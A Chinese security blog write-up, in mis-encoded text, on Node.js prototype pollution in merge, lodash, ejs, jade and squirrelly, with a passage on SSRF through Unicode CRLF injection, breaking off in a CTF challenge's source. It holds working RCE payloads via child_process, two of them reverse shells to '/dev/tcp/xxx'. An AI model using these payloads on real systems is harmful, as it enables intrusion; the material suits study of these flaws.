<pre><code class="html">var o = &#123;a: 1&#125;;
// oå¯¹è±¡ç›´æ¥ç»§æ‰¿äº†Object.prototype
// åŸå‹é“¾ï¼š
// o ---&gt; Object.prototype ---&gt; null

var a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];
// æ•°ç»„éƒ½ç»§æ‰¿äº Array.prototype
// åŸå‹é“¾ï¼š
// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null

function f()&#123;
return 2;
&#125;
// å‡½æ•°éƒ½ç»§æ‰¿äº Function.prototype
// åŸå‹é“¾ï¼š
// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null
</code></pre>
<p>çŸ¥é“äº†ä»¥ä¸Šä¸‰ç‚¹ä»¥åï¼Œæˆ‘ä»¬æ¥ä»‹ç»å¦‚ä½•è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p>
<p> å¯¹äºè¯­å¥ï¼šobject[a][b] = value å¦‚æœå¯ä»¥æ§åˆ¶aã€bã€valueçš„å€¼ï¼Œå°†aè®¾ç½®ä¸º__proto__ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»™objectå¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ªbå±æ€§ï¼Œå€¼ä¸ºvalueã€‚è¿™æ ·æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡åœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalueã€‚<br> æ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­:  </p>
<pre><code class="html">object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;
object1.__proto__.foo = &quot;Hello World&quot;;
console.log(object1.foo);
object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;
console.log(object2.foo);
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668790669590-6b7771d7-3023-46f0-bb45-2ddec0c9e219.png" alt="image.png"><br>æœ€ç»ˆè¾“å‡ºäº†ä¸¤ä¸ªhello word<br>ä¸ºä»€ä¹ˆobject2åœ¨æ²¡æœ‰è®¾ç½®fooå±æ€§çš„æƒ…å†µä¸‹ï¼Œä¹Ÿä¼šè¾“å‡ºHello Worldå‘¢ï¼Ÿå°±æ˜¯å› ä¸ºåœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­ï¼Œæˆ‘ä»¬å¯¹object1çš„åŸå‹å¯¹è±¡è®¾ç½®äº†ä¸€ä¸ªfooå±æ€§ï¼Œè€Œobject2å’Œobject1ä¸€æ ·ï¼Œéƒ½æ˜¯ç»§æ‰¿äº†Object.prototypeã€‚åœ¨è·å–object2.fooæ—¶ï¼Œç”±äºobject2æœ¬èº«ä¸å­˜åœ¨fooå±æ€§ï¼Œå°±ä¼šå¾€çˆ¶ç±»Object.prototypeä¸­å»å¯»æ‰¾ã€‚è¿™å°±é€ æˆäº† ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œæ‰€ä»¥åŸå‹é“¾æ±¡æŸ“ç®€å•æ¥è¯´å°±æ˜¯å¦‚æœèƒ½å¤Ÿæ§åˆ¶å¹¶ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œå°±å¯ä»¥å½±å“åˆ°æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡åŒä¸€ä¸ªåŸå‹çš„å¯¹è±¡ã€‚</p>
<h2 id="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"><a href="#mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"></a>mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“</h2><p>mergeæ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ã€‚<br>ä¾‹å­:</p>
<pre><code class="javascript">function merge(target, source) &#123;
for (let key in source) &#123;
    if (key in source &amp;&amp; key in target) &#123;
        merge(target[key], source[key])
    &#125; else &#123;
        target[key] = source[key]
        &#125;
    &#125;
&#125;

let object1 = &#123;&#125;
let object2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)
merge(object1, object2)
console.log(object1.a, object1.b)

object3 = &#123;&#125;
console.log(object3.b)

# merge() å‡½æ•°ç”¨äºåˆå¹¶ä¸¤ä¸ªæ•°ç»„å†…å®¹åˆ°ç¬¬ä¸€ä¸ªæ•°ç»„ã€‚åœ¨æœ¬æ®µä»£ç çš„ä½œç”¨å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­
</code></pre>
<p>éœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼š<br>åœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ__proto__ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†object2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚<br>æˆ‘ä»¬æ¥çœ‹ä¸‹ï¼Œæœ‰å’Œæ²¡æœ‰JSONè§£æçš„åŒºåˆ«</p>
<pre><code class="javascript">&lt;script&gt;
          let o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;
        console.log(o2)
      let object2=JSON.parse(&#39;&#123;&quot;a&quot;:1,&quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#39;)
      console.log(object2)
  &lt;/script&gt;
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668836886258-58f08cf3-4739-40b1-ade0-6f1a54f8dc7f.png" alt="image-20220416001143881.png"><br> æ‰€ä»¥ä»£ç åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šå­˜åœ¨è¿™ä¹ˆä¸€æ­¥  </p>
<pre><code class="javascript">target[__proto__]=source[__proto__]
å¯ç†è§£ä¸º  object.prototype = &#123;&quot;b&quot;: 2&#125; å¯¼è‡´äº†åŸå‹é“¾æ±¡æŸ“
</code></pre>
<p> æœ€ç»ˆè¾“å‡ºçš„ç»“æœä¸ºï¼š<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668839912381-24bdf37b-f5df-41ea-a963-e5c31549da5d.png" alt="image.png"><br> å¯è§object3çš„bæ˜¯ä»åŸå‹ä¸­è·å–åˆ°çš„ï¼Œè¯´æ˜Objectå·²ç»è¢«æ±¡æŸ“äº†ã€‚  </p>
<h2 id="lodash"><a href="#lodash" class="headerlink" title="lodash"></a>lodash</h2><blockquote>
<p> lodashæ˜¯ä¸ºäº†å¼¥è¡¥JavaScriptåŸç”Ÿå‡½æ•°åŠŸèƒ½ä¸è¶³è€Œæä¾›çš„ä¸€ä¸ªè¾…åŠ©åŠŸèƒ½é›†ï¼Œå…¶ä¸­åŒ…å«å­—ç¬¦ä¸²ã€æ•°ç»„ã€å¯¹è±¡ç­‰æ“ä½œã€‚è¿™ä¸ªWebåº”ç”¨ä¸­ï¼Œä½¿ç”¨äº†lodashæä¾›çš„ä¸¤ä¸ªå·¥å…·ï¼š  </p>
<ol>
<li>lodash.template ä¸€ä¸ªç®€å•çš„æ¨¡æ¿å¼•æ“</li>
<li>lodash.merge å‡½æ•°æˆ–å¯¹è±¡çš„åˆå¹¶</li>
</ol>
<p> å…¶å®æ•´ä¸ªåº”ç”¨é€»è¾‘å¾ˆç®€å•ï¼Œç”¨æˆ·æäº¤çš„ä¿¡æ¯ï¼Œç”¨mergeæ–¹æ³•åˆå¹¶åˆ°sessioné‡Œï¼Œå¤šæ¬¡æäº¤ï¼Œsessioné‡Œæœ€ç»ˆä¿å­˜ä½ æäº¤çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p>
</blockquote>
<p>ä»¥<a target="_blank" rel="noopener" href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">Code-Breaking 2018 Thejs</a>ä¸ºä¾‹è¯´æ˜åˆ†æè¿‡ç¨‹:<br> é¢˜ç›®æºç ä¸‹è½½ï¼š<a target="_blank" rel="noopener" href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p>
<pre><code class="javascript">const fs = require(&#39;fs&#39;)
const express = require(&#39;express&#39;)
const bodyParser = require(&#39;body-parser&#39;)
const lodash = require(&#39;lodash&#39;)
const session = require(&#39;express-session&#39;)
const randomize = require(&#39;randomatic&#39;)

const app = express()
app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())
app.use(&#39;/static&#39;, express.static(&#39;static&#39;))
app.use(session(&#123;
    name: &#39;thejs.session&#39;,
    secret: randomize(&#39;aA0&#39;, 16),
    resave: false,
    saveUninitialized: false
&#125;))
app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine
    fs.readFile(filePath, (err, content) =&gt; &#123;
        if (err) return callback(new Error(err))
        let compiled = lodash.template(content)
        let rendered = compiled(&#123;...options&#125;)

        return callback(null, rendered)
    &#125;)
&#125;)
app.set(&#39;views&#39;, &#39;./views&#39;)
app.set(&#39;view engine&#39;, &#39;ejs&#39;)

app.all(&#39;/&#39;, (req, res) =&gt; &#123;
    let data = req.session.data || &#123;language: [], category: []&#125;
    if (req.method == &#39;POST&#39;) &#123;
        data = lodash.merge(data, req.body)
        req.session.data = data
    &#125;
    
    res.render(&#39;index&#39;, &#123;
        language: data.language, 
        category: data.category
    &#125;)
&#125;)

app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))
</code></pre>
<p> é—®é¢˜å‡ºåœ¨lodash.merge()å‡½æ•°,è¿™ä¸ªå‡½æ•°å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚æˆ‘ä»¬å¾—å¯»æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚å› ä¸ºé€šè¿‡æ¼æ´å¯ä»¥æ§åˆ¶æŸä¸€ç§å®ä¾‹å¯¹è±¡åŸå‹çš„å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»å¯»æ‰¾ä¸€ä¸ªå¯ä»¥è¢«åˆ©ç”¨çš„å±æ€§ã€‚<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840471628-b5711487-8536-4a31-b5b4-c779de7628db.png" alt="image-20220416004841823.png"><br> é¡µé¢æœ€ç»ˆä¼šé€šè¿‡lodash.templateè¿›è¡Œæ¸²æŸ“<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840499521-d6d64285-7a69-4e69-b6fb-a8221e5ff74f.png" alt="image-20220416005502144.png"><br> è·Ÿè¸ªåˆ°lodash/template.jsä¸­<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840571097-a32cb4ca-8bf1-44a2-b1ff-940d5d715282.png" alt="QyN5JVOde3YL8aZ.png"><br>å¦‚å›¾å¯ä»¥çœ‹åˆ°optionsæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒsourceURLæ˜¯é€šè¿‡ä¸‹é¢çš„è¯­å¥èµ‹å€¼çš„ï¼Œoptionsé»˜è®¤æ²¡æœ‰sourceURLå±æ€§ï¼Œæ‰€ä»¥sourceURLé»˜è®¤ä¹Ÿæ˜¯ä¸ºç©ºã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿç»™optionsçš„åŸå‹å¯¹è±¡åŠ ä¸€ä¸ªsourceURLå±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶sourceURLçš„å€¼ã€‚<br>ç»§ç»­å¾€ä¸‹é¢çœ‹ï¼Œæœ€åsourceURLä¼ é€’åˆ°äº†Functionå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å½“ä¸­ï¼š<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840627165-a79efcc5-3819-4e3f-8a7d-a2accd1ef055.png" alt="pwoVFrOyfzJX42M.png"><br>é€šè¿‡æ„é€ chile_process.exec()å°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚<br>æœ€ç»ˆå¯ä»¥æ„é€ ä¸€ä¸ªç®€å•çš„Payloadä½œä¸ºä¼ é€’ç»™ä¸»é¡µé¢çš„çš„POSTæ•°æ®(windowsè°ƒç”¨è®¡ç®—å™¨)ï¼š</p>
<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)//&quot;&#125;&#125;
</code></pre>
<p>(è¿™é‡Œç›´æ¥ç”¨requireä¼šæŠ¥é”™ï¼šReferenceError: require is not defined<br>pç¥ç»™äº†ä¸€ä¸ªæ›´å¥½çš„payloadï¼š</p>
<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;
</code></pre>
<h2 id="ejs"><a href="#ejs" class="headerlink" title="ejs"></a>ejs</h2><blockquote>
<p>ä¸»è¦ä¸ºä¸¤ä¸ªå‡½æ•°çš„ä¼ªé€ ã€‚<br>opts.outputFunctionName<br>opts.escapeFunction</p>
</blockquote>
<p><strong>ä¾‹ä¸€</strong><br> test.js  </p>
<pre><code class="javascript">var express = require(&#39;express&#39;);
var _= require(&#39;lodash&#39;);
var ejs = require(&#39;ejs&#39;);

var app = express();
//è®¾ç½®æ¨¡æ¿çš„ä½ç½®
app.set(&#39;views&#39;, __dirname);

//å¯¹åŸå‹è¿›è¡Œæ±¡æŸ“
var malicious_payload = &#39;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;&#39;;
_.merge(&#123;&#125;, JSON.parse(malicious_payload));

//è¿›è¡Œæ¸²æŸ“
app.get(&#39;/&#39;, function (req, res) &#123;
    res.render (&quot;./test.ejs&quot;,&#123;
        message: &#39;lufei test &#39;
    &#125;);
&#125;);

//è®¾ç½®http
var server = app.listen(8081, function () &#123;

    var host = server.address().address
    var port = server.address().port

    console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s&quot;, host, port)
&#125;);
</code></pre>
<p> test.ejs  </p>
<pre><code class="javascript">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;h1&gt;&lt;%= message%&gt;&lt;/h1&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p> payloadï¼š  </p>
<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;
</code></pre>
<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;
</code></pre>
<p><strong>ä¾‹äºŒ</strong></p>
<pre><code class="javascript">router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;
  res.type(&#39;html&#39;);
  var user = new function()&#123;
    this.userinfo = new function()&#123;
    this.isVIP = false;
    this.isAdmin = false;    
    &#125;;
  &#125;;
  utils.copy(user.userinfo,req.body);
  if(user.userinfo.isAdmin)&#123;
    return res.json(&#123;ret_code: 0, ret_msg: &#39;login success!&#39;&#125;);  
  &#125;else&#123;
    return res.json(&#123;ret_code: 2, ret_msg: &#39;login fail!&#39;&#125;);  
  &#125;

&#125;);
</code></pre>
<p>**<em>payload1</em>**ï¼šè¦†ç›– opts.outputFunctionName , è¿™æ ·æ„é€ çš„payloadå°±ä¼šè¢«æ‹¼æ¥è¿›jsè¯­å¥ä¸­ï¼Œå¹¶åœ¨ ejs æ¸²æŸ“æ—¶è¿›è¡Œ RCEã€‚  </p>
<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); //&quot;&#125;&#125;&#125;

&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); __tmp2&quot;&#125;&#125;&#125;
</code></pre>
<p>**<em>payload2</em>**ï¼šä¼ªé€  opts.escapeFunction ä¹Ÿå¯ä»¥è¿›è¡Œ RCE  </p>
<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);&quot;&#125;&#125;&#125;
</code></pre>
<p><strong>è¡¥å……:</strong> åœ¨ ejs æ¨¡æ¿ä¸­è¿˜æœ‰ä¸‰ä¸ªå¯æ§çš„å‚æ•°, åˆ†åˆ«ä¸º opts.localsName å’Œ opts.destructuredLocals å’Œ opts.filename, ä½†æ˜¯è¿™ä¸‰ä¸ªæ— æ³•æ„å»ºå‡ºåˆé€‚çš„æ±¡æŸ“é“¾ã€‚  </p>
<h2 id="jade"><a href="#jade" class="headerlink" title="jade"></a>jade</h2><p>compileDebugçš„ä¼ªé€ <br>ç»™å‡ºä¸Šé¢é¢˜ç›®çš„payloadï¼Œå¯å‚è€ƒç€çœ‹ã€‚</p>
<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;console.log(global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/1234 0&gt;&amp;1\&quot;&#39;))&quot;&#125;&#125;
</code></pre>
<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);//&quot;&#125;&#125;&#125;
</code></pre>
<h2 id="squirrelly"><a href="#squirrelly" class="headerlink" title="squirrelly"></a>squirrelly</h2><p><strong><em>CVE-2021-32819</em></strong><br>server.js</p>
<pre><code class="javascript">const express = require(&#39;express&#39;)
const squirrelly = require(&#39;squirrelly&#39;)
const app = express()

app.set(&#39;views&#39;, __dirname);
app.set(&#39;view engine&#39;, &#39;squirrelly&#39;)
app.use(express.urlencoded(&#123; extended: false &#125;));
app.get(&#39;/&#39;, (req, res) =&gt; &#123;
   res.render(&#39;index.squirrelly&#39;, req.query)
&#125;)

var server = app.listen(3000, &#39;0.0.0.0&#39;, function () &#123;

    var host = server.address().address
    var port = server.address().port

    console.log(&quot;Listening on http://%s:%s&quot;, host, port)
&#125;);
</code></pre>
<p> index.squirrelly  </p>
<pre><code class="javascript">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;CVE-2021-32819&lt;/title&gt;
        &lt;h1&gt;Test For CVE-2021-32819&lt;/h1&gt;
    &lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;&#123;&#123;it.variable&#125;&#125;&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p> payload  </p>
<pre><code class="javascript">/?defaultFilter=e&#39;)); let require = global.require || global.process.mainModule.constructor._load; require(&#39;child_process&#39;).exec(&#39;dir&#39;); //
</code></pre>
<p>PS:ä»¥ä¸‹è´´å‡ºå‡ ç¯‡æ–‡ç« ï¼Œå¸ˆå‚…ä»¬å¯ä»¥è·Ÿè¿›åˆ†æï¼š<br><a target="_blank" rel="noopener" href="https://www.aisoutu.com/a/1373814">https://www.aisoutu.com/a/1373814</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2035888">https://cloud.tencent.com/developer/article/2035888</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/276112.html">https://www.freebuf.com/vuls/276112.html</a><br><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">å‡ ä¸ªnodeæ¨¡æ¿å¼•æ“çš„åŸå‹é“¾æ±¡æŸ“åˆ†æ</a></p>
<h1 id="nodejsä¸­çš„ssrf"><a href="#nodejsä¸­çš„ssrf" class="headerlink" title="nodejsä¸­çš„ssrf"></a>nodejsä¸­çš„ssrf</h1><h2 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>**è™½ç„¶ç”¨æˆ·å‘å‡ºçš„httpè¯·æ±‚é€šå¸¸å°†è¯·æ±‚è·¯å¾„æŒ‡å®šä¸ºå­—ç¬¦ä¸²ï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä½œä¸ºåŸå§‹å­—èŠ‚è¾“å‡ºã€‚JavaScriptæ”¯æŒunicodeå­—ç¬¦ä¸²ï¼Œå› æ­¤å°†å®ƒä»¬è½¬æ¢ä¸ºå­—èŠ‚æ„å‘³ç€é€‰æ‹©å¹¶åº”ç”¨é€‚å½“çš„unicodeç¼–ç ã€‚å¯¹äºä¸åŒ…å«ä¸»ä½“çš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦ã€‚ç›¸åï¼Œè¿™äº›å­—ç¬¦è¢«æˆªæ–­ä¸ºå…¶JavaScriptè¡¨ç¤ºçš„æœ€ä½å­—èŠ‚  **</p>
<pre><code class="plsql">&gt; v = &quot;/caf\u&#123;E9&#125;\u&#123;01F436&#125;&quot;
&#39;/cafÃ©ğŸ¶&#39;
&gt; Buffer.from(v,&#39;latin1&#39;).toString(&#39;latin1&#39;)
&#39;/cafÃ©=6&#39;
</code></pre>
<p><strong>Crlf HTTPå¤´æ³¨å…¥:</strong><br> å‡è®¾ä¸€ä¸ªæœåŠ¡å™¨ï¼Œæ¥å—ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å°†å…¶åŒ…å«åœ¨é€šè¿‡HTTPå…¬å¼€çš„å†…éƒ¨æœåŠ¡è¯·æ±‚ä¸­ï¼Œåƒè¿™æ ·ï¼š  </p>
<pre><code class="plsql">GET /private-api?q=&lt;user-input-here&gt; HTTP/1.1
Authorization: server-secret-key
</code></pre>
<p> å¦‚æœæœåŠ¡å™¨æœªæ­£ç¡®éªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šç›´æ¥æ³¨å…¥åè®®æ§åˆ¶å­—ç¬¦åˆ°è¯·æ±‚é‡Œã€‚å‡è®¾åœ¨è¿™ç§æƒ…å†µä¸‹æœåŠ¡å™¨æ¥å—äº†ä»¥ä¸‹ç”¨æˆ·è¾“å…¥ï¼š  </p>
<pre><code class="plsql">&quot;x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n&quot;
</code></pre>
<p> åœ¨å‘å‡ºè¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šç›´æ¥å°†å…¶å†™å…¥è·¯å¾„ï¼Œå¦‚ä¸‹ï¼š  </p>
<pre><code class="plsql">GET /private-api?q=x HTTP/1.1

DELETE /private-api
Authorization: server-secret-key
</code></pre>
<p><strong>è¯´åˆ°åº•å°±æ˜¯\r\næˆåŠŸç”Ÿæ•ˆ</strong><br>æ¥æ”¶æœåŠ¡å°†æ­¤è§£é‡Šä¸ºä¸¤ä¸ªå•ç‹¬çš„HTTPè¯·æ±‚ï¼Œä¸€ä¸ªGETåè·Ÿä¸€ä¸ªDELETE<br>å¥½çš„HTTPåº“é€šé€šå¸¸åŒ…å«é˜»æ­¢è¿™ä¸€è¡Œä¸ºçš„æªæ–½ï¼ŒNode.jsä¹Ÿä¸ä¾‹å¤–ï¼šå¦‚æœä½ å°è¯•å‘å‡ºä¸€ä¸ªè·¯å¾„ä¸­å«æœ‰æ§åˆ¶å­—ç¬¦çš„HTTPè¯·æ±‚ï¼Œå®ƒä»¬ä¼šè¢«URLç¼–ç ï¼š</p>
<pre><code class="plsql">http.get(&#39;http://example.com/\r\n/test&#39;).output
[ &#39;GET /%0D%0A/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]
</code></pre>
<p> ä¸å¹¸çš„æ˜¯ï¼Œä¸Šè¿°çš„å¤„ç†unicodeå­—ç¬¦é”™è¯¯æ„å‘³ç€å¯ä»¥è§„é¿è¿™äº›æªæ–½ã€‚è€ƒè™‘å¦‚ä¸‹çš„URLï¼Œå…¶ä¸­åŒ…å«ä¸€äº›å¸¦å˜éŸ³ç¬¦å·çš„unicodeå­—ç¬¦ï¼š  </p>
<pre><code class="plsql">&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;
http://example.com/ÄÄŠ/test
</code></pre>
<p> å½“Node.jsç‰ˆæœ¬8æˆ–æ›´ä½ç‰ˆæœ¬å¯¹æ­¤URLå‘å‡ºGETè¯·æ±‚æ—¶ï¼Œå®ƒä¸ä¼šè¿›è¡Œè½¬ä¹‰ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯HTTPæ§åˆ¶å­—ç¬¦ï¼š  </p>
<pre><code class="plsql">http.get(&#39;http://example.com/\u010D\u010A/test&#39;).output
[ &#39;GET /ÄÄŠ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]
</code></pre>
<p> ä½†æ˜¯å½“ç»“æœå­—ç¬¦ä¸²è¢«ç¼–ç ä¸ºlatin1å†™å…¥è·¯å¾„æ—¶ï¼Œè¿™äº›å­—ç¬¦å°†åˆ†åˆ«è¢«æˆªæ–­ä¸ºâ€œ\râ€å’Œâ€œ\nâ€ï¼š  </p>
<pre><code class="plsql">Buffer.from(&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;, &#39;latin1&#39;).toString()
&#39;http://example.com/\r\n/test&#39;
</code></pre>
<p>Node.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦<br>è¯´ç™½äº†ï¼Œä¸Šé¢è¿™æ®µçš„æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå®ƒä»¬åœ¨URLè¯·æ±‚æ—¶ä¸ä¼šè¢«è½¬ä¹‰å¤„ç†ï¼Œä½†æ˜¯å½“å®ƒåˆ°äº†jså¼•æ“æ—¶ï¼Œç”±äºå…¶é»˜è®¤ç”¨çš„æ˜¯latin1ï¼Œå› æ­¤å¯ä»¥å°†æˆ‘ä»¬ç”¨çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ï¼Œä»è€Œè¾¾åˆ°ssrfçš„ç›®çš„</p>
<h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p><strong>sourceï¼š</strong></p>
<pre><code class="plsql">var express = require(&#39;express&#39;); 
var app = express(); 
var fs = require(&#39;fs&#39;); 
var path = require(&#39;path&#39;); // å¤„ç†æ–‡ä»¶è·¯å¾„ 
var http = require(&#39;http&#39;); 
var pug = require(`pug`); // æ¨¡æ¿æ¸²æŸ“ 
var morgan = require(&#39;morgan&#39;); // æ—¥å¿— 
